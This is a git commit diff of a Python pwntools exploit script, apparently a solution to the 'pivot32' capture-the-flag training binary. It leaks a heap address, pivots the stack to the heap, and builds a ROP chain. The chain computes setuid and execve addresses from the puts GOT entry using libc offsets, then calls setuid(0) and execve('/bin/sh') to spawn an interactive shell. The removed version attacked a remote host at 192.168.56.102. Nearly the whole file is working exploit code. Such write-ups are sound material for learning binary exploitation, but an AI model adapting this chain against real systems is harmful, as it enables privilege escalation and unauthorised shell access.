0bd4b47e1713f7a4b7e3bd06f00f2e8f47df7551
root <root@localhost.localdomain>
2018-02-06 04:21:09 +0000

    nacional

--- pivot32/shell.py
+++ pivot32/shell.py
@@ -1,65 +1,55 @@
+# Credit to ompamo
 #!/usr/bin/env python2
 from pwn import *
 
-# remote connection
-p = remote("192.168.56.102", 8888)
-
-# useful address
-main = p32(0x0804873b)
-puts_plt = p32(0x080485d0)
-foothold_got = p32(0x0804a024)
-foothold_plt = p32(0x080485f0)
+p = process("./pivot32")
+# useful address (adjust offsets according to your LIBC version)
+puts_got = p32(0x804a01c)
+execve_off = p32(0x56cc0) # 0xbde20(execve_plt)-0x67160(puts_plt)
+setuid_off = p32(0x57530) # 0xbe690(execve_plt)-0x67160(puts_plt)
 
 # gadgets
-leave = p32(0x0804889e)
-pop_ebx = p32(0x08048571)
+xchg_eax_esp = p32(0x080488c2)
+pop_eax = p32(0x080488c0)
+pop_ebx = p32(0x08048946)
+mov_eax_dleax = p32(0x080488c4)
+add_eax_ebx = p32(0x080488c7)
+jmp_eax = p32(0x08048a5f)
+
+def rop_ret2execve(got_address, offset, next_rop, p1, p2, p3):
+    payload = ''
+    payload += pop_eax + got_address + mov_eax_dleax  # eax has puts plt
+    payload += pop_ebx + offset + add_eax_ebx         # eax has execve plt
+    payload += jmp_eax + next_rop + p32(p1) + p32(p2) + p32(p3)
+    return payload
+
+def rop_ret2setuid(got_address, offset, next_rop, p1):
+    payload = ''
+    payload += pop_eax + got_address + mov_eax_dleax   # eax has puts plt
+    payload += pop_ebx + offset + add_eax_ebx          # eax has setuid plt
+    payload += jmp_eax + next_rop + p32(p1)
+    return payload
 
 # Get heap address
 leak_addr = p.recvline_contains("The Old Gods").strip().rsplit(' ', 1)[1]
 log.info("Leaked heap address is at: " + str(leak_addr))
 heap_addr = u32(unhex(leak_addr[2:]), endian='big')
 
-# Stage one: resolve foothold_function address
-pay1 = foothold_plt
-pay1 += puts_plt
-pay1 += main
-pay1 += foothold_got # pop foothold_got address into eax
-pay1 += "/bin/sh\x00"
-pay1 += "A"*271
-pay1 += p32(heap_addr-4)
-pay1 += leave
-
-p.sendline(pay1)
-p.sendline() # We don't need stack smash
-foothold_libpivot = u32(p.recvuntil('pivot by')[-13:-9])
-next_leak = p.recvline_contains("The Old Gods").strip().rsplit(' ',1)[1]
-next_heap_addr = u32(unhex(next_leak[2:]), endian='big')
-
-# Offsets
-libpivot_base = foothold_libpivot - 0x770
-system = libpivot_base + 0x610
-ret2win = libpivot_base + 0x967
-ebx_val = libpivot_base + 0x2000
-sh_addr = heap_addr + 0x10
-
-# Debugging
-log.info("The next leaked heap address is at: 0x%x" % next_heap_addr)
-log.info("foothold_plt addr: 0x%x" % foothold_libpivot)
-log.info("libpivot_base addr: 0x%x" % libpivot_base)
-log.info("System address: 0x%x" % system)
-log.info("ebx_val: 0x%xd" % ebx_val)
+shell_command = "/bin/sh\x00"
+# Stage one: pivot stack to heap address
+pay1 = "A"*44
+pay1 += pop_eax
+pay1 += p32(heap_addr + len(shell_command))
+pay1 += xchg_eax_esp
 
 
-# Stage two: Spawn shell
-pay2 = pop_ebx
-pay2 += p32(ebx_val)
-pay2 += p32(system)
-pay2 += p32(sh_addr)
-pay2 += "A"*279
-pay2 += p32(next_heap_addr - 4)
-pay2 += leave
-
+# Stage two: call "setuid" and "execve"
+pay2 = shell_command
+# Execute setuid. To return clean we need to call "pop eax; ret"
+pay2 += rop_ret2setuid(puts_got, setuid_off, pop_eax, 0x0)
+pay2 += rop_ret2execve(puts_got, execve_off, pop_eax, heap_addr, 0x0, 0x0)
 
 p.sendline(pay2)
-p.sendline() # We don't need stack smash
+p.sendline(pay1)
 p.interactive()
+
